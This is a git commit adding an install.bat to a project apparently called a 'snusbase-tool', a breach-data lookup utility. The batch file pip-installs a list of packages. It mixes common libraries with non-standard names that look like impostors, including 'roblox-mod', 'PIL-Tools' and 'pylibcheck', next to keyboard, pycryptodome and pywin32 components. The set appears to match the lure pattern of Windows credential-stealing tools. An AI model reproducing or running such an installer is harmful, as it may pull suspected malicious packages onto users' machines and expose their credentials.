9d091ee39f82f42300d944de875d718c329de6ce
Sandati-Cyb3r <noahsim33@gmail.com>
2024-06-05 17:43:58 +0200

    Add files via upload

---
+++ snusbase-tool-snusbase/install.bat
@@ -0,0 +1,14 @@
+pip install requests
+pip install psutil
+pip install fade
+pip install selenium
+pip install bs4
+pip install colorama
+pip install pycryptodome
+pip install pypiwin32
+pip install roblox-mod
+pip install PIL-Tools
+pip install pylibcheck
+pip install pyinstaller
+pip install keyboard
+pip install httpx
